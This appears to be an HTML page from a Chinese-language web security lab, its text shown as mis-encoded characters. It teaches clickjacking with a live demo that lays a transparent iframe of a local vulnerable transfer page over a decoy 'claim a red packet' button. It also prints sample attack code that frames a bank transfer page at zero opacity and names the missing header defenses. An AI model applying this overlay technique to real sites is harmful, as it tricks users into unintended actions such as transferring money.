<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>iframe è¦†ç›–æ”»å‡» - Clickjacking Lab</title>
  <link rel="stylesheet" href="../xss/style.css">
  <style>
    .attack-container {
      position: relative;
      width: 100%;
      max-width: 500px;
      margin: 20px auto;
    }
    
    .decoy-layer {
      position: relative;
      background: linear-gradient(135deg, #ff6b6b, #ee5a24);
      padding: 40px;
      border-radius: 12px;
      text-align: center;
      color: white;
      z-index: 1;
    }
    
    .decoy-layer h2 {
      margin: 0 0 10px 0;
      font-size: 24px;
    }
    
    .decoy-layer p {
      margin: 0 0 20px 0;
      opacity: 0.9;
    }
    
    .decoy-btn {
      background: #fff;
      color: #ee5a24;
      border: none;
      padding: 15px 40px;
      font-size: 18px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: bold;
    }
    
    .iframe-layer {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      z-index: 2;
    }
    
    .iframe-layer iframe {
      width: 100%;
      height: 100%;
      border: none;
    }
    
    .opacity-control {
      margin: 20px 0;
      padding: 15px;
      background: #f5f5f5;
      border-radius: 8px;
    }
    
    .opacity-control label {
      display: block;
      margin-bottom: 10px;
      font-weight: bold;
    }
    
    .opacity-control input[type="range"] {
      width: 100%;
    }
    
    .victim-view, .attacker-view {
      border: 2px dashed #ccc;
      padding: 20px;
      margin: 20px 0;
      border-radius: 8px;
    }
    
    .victim-view { border-color: #4caf50; }
    .attacker-view { border-color: #f44336; }
    
    .view-label {
      display: inline-block;
      padding: 4px 12px;
      border-radius: 4px;
      font-size: 12px;
      margin-bottom: 10px;
    }
    
    .victim-view .view-label { background: #e8f5e9; color: #2e7d32; }
    .attacker-view .view-label { background: #ffebee; color: #c62828; }
  </style>
</head>
<body>
  <div class="container">
    <a href="index.html" class="back-link">â† è¿”å› Clickjacking Lab</a>
    
    <h1>ğŸ¯ å®éªŒä¸€ï¼šiframe è¦†ç›–æ”»å‡»</h1>

    <div class="warning-box">
      <strong>âš ï¸ æ”»å‡»æ¼”ç¤º</strong>
      <p>è°ƒæ•´é€æ˜åº¦æ»‘å—ï¼Œè§‚å¯Ÿæ”»å‡»è€…å¦‚ä½•éšè—çœŸå®çš„é“¶è¡Œé¡µé¢</p>
    </div>

    <section>
      <h2>ğŸ“– æ”»å‡»åŸç†</h2>
      <div class="info-box">
        <ol>
          <li>æ”»å‡»è€…åˆ›å»ºä¸€ä¸ªè¯±äººçš„é¡µé¢ï¼ˆå¦‚"é¢†å–çº¢åŒ…"ï¼‰</li>
          <li>åœ¨é¡µé¢ä¸Šè¦†ç›–ä¸€ä¸ªé€æ˜çš„ iframeï¼ŒåŠ è½½ç›®æ ‡ç½‘ç«™</li>
          <li>è°ƒæ•´ iframe ä½ç½®ï¼Œä½¿ç›®æ ‡æŒ‰é’®ä¸è¯±é¥µæŒ‰é’®é‡å </li>
          <li>ç”¨æˆ·ä»¥ä¸ºç‚¹å‡»è¯±é¥µï¼Œå®é™…ç‚¹å‡»äº† iframe ä¸­çš„çœŸå®æŒ‰é’®</li>
        </ol>
      </div>
    </section>

    <section>
      <h2>ğŸ® æ”»å‡»æ¼”ç¤º</h2>
      
      <div class="opacity-control">
        <label>iframe é€æ˜åº¦: <span id="opacity-value">0%</span> (æ”»å‡»æ—¶è®¾ä¸º 0%)</label>
        <input type="range" id="opacity-slider" min="0" max="100" value="0" oninput="updateOpacity(this.value)">
      </div>

      <div class="attacker-view">
        <span class="view-label">ğŸ‘¿ æ”»å‡»è€…è§†è§’</span>
        <p>ç”¨æˆ·çœ‹åˆ°çš„æ˜¯ä¸‹é¢çš„"é¢†å–çº¢åŒ…"é¡µé¢ï¼Œä½†å®é™…ç‚¹å‡»çš„æ˜¯é€æ˜ iframe ä¸­çš„é“¶è¡Œè½¬è´¦æŒ‰é’®</p>
        
        <div class="attack-container">
          <!-- è¯±é¥µå±‚ -->
          <div class="decoy-layer">
            <h2>ğŸ æ­å–œæ‚¨è·å¾—çº¢åŒ…ï¼</h2>
            <p>ç‚¹å‡»ä¸‹æ–¹æŒ‰é’®ç«‹å³é¢†å– Â¥1000</p>
            <button class="decoy-btn">ç«‹å³é¢†å–</button>
          </div>
          
          <!-- iframe è¦†ç›–å±‚ -->
          <div class="iframe-layer" id="iframe-layer">
            <iframe src="/api/clickjacking/unsafe/transfer-page" id="target-iframe"></iframe>
          </div>
        </div>
      </div>

      <div class="victim-view">
        <span class="view-label">ğŸ˜‡ å—å®³è€…è§†è§’</span>
        <p>å½“ iframe å®Œå…¨é€æ˜æ—¶ï¼Œç”¨æˆ·åªèƒ½çœ‹åˆ°è¯±é¥µé¡µé¢</p>
        <ul>
          <li>ç”¨æˆ·ä»¥ä¸ºåœ¨é¢†å–çº¢åŒ…</li>
          <li>å®é™…è§¦å‘äº†é“¶è¡Œè½¬è´¦</li>
          <li>Â¥1000 è¢«è½¬èµ°</li>
        </ul>
      </div>
    </section>

    <section>
      <h2>ğŸ“Š è´¦æˆ·çŠ¶æ€</h2>
      <div class="info-box">
        <p>å½“å‰ä½™é¢: <strong id="balance">åŠ è½½ä¸­...</strong></p>
        <p>è¢«åŠ«æŒè½¬è´¦æ¬¡æ•°: <span id="hijack-count">0</span></p>
        <button onclick="resetAccount()" class="btn" style="margin-top: 10px;">é‡ç½®è´¦æˆ·</button>
        <button onclick="loadAccount()" class="btn btn-secondary" style="margin-top: 10px; margin-left: 10px;">åˆ·æ–°çŠ¶æ€</button>
      </div>
    </section>

    <section>
      <h2>ğŸ’» æ”»å‡»ä»£ç </h2>
      <pre><code>&lt;!-- æ”»å‡»è€…é¡µé¢ --&gt;
&lt;div style="position: relative;"&gt;
  &lt;!-- è¯±é¥µå±‚ --&gt;
  &lt;div class="decoy"&gt;
    &lt;h2&gt;ğŸ é¢†å–çº¢åŒ…&lt;/h2&gt;
    &lt;button&gt;ç«‹å³é¢†å–&lt;/button&gt;
  &lt;/div&gt;
  
  &lt;!-- é€æ˜ iframe è¦†ç›– --&gt;
  &lt;iframe 
    src="https://bank.com/transfer" 
    style="
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      opacity: 0;  /* å®Œå…¨é€æ˜ */
    "&gt;
  &lt;/iframe&gt;
&lt;/div&gt;</code></pre>
    </section>

    <section>
      <h2>ğŸ” ä¸ºä»€ä¹ˆæ”»å‡»æˆåŠŸï¼Ÿ</h2>
      <div class="info-box">
        <p>ç›®æ ‡é¡µé¢ <strong>æ²¡æœ‰è®¾ç½®</strong> ä»¥ä¸‹é˜²æŠ¤å¤´ï¼š</p>
        <ul>
          <li><code>X-Frame-Options: DENY</code></li>
          <li><code>Content-Security-Policy: frame-ancestors 'none'</code></li>
        </ul>
        <p>å› æ­¤å¯ä»¥è¢«ä»»æ„é¡µé¢é€šè¿‡ iframe åµŒå…¥</p>
      </div>
    </section>
  </div>

  <script>
    function updateOpacity(value) {
      document.getElementById('opacity-value').textContent = value + '%'
      document.getElementById('iframe-layer').style.opacity = value / 100
    }

    async function loadAccount() {
      const res = await fetch('/api/clickjacking/account')
      const data = await res.json()
      document.getElementById('balance').textContent = `Â¥${data.balance}`
      const hijackCount = data.actions.filter(a => !a.protected).length
      document.getElementById('hijack-count').textContent = hijackCount
    }

    async function resetAccount() {
      await fetch('/api/clickjacking/reset', { method: 'POST' })
      loadAccount()
    }

    loadAccount()
    setInterval(loadAccount, 2000)
  </script>
</body>
</html>
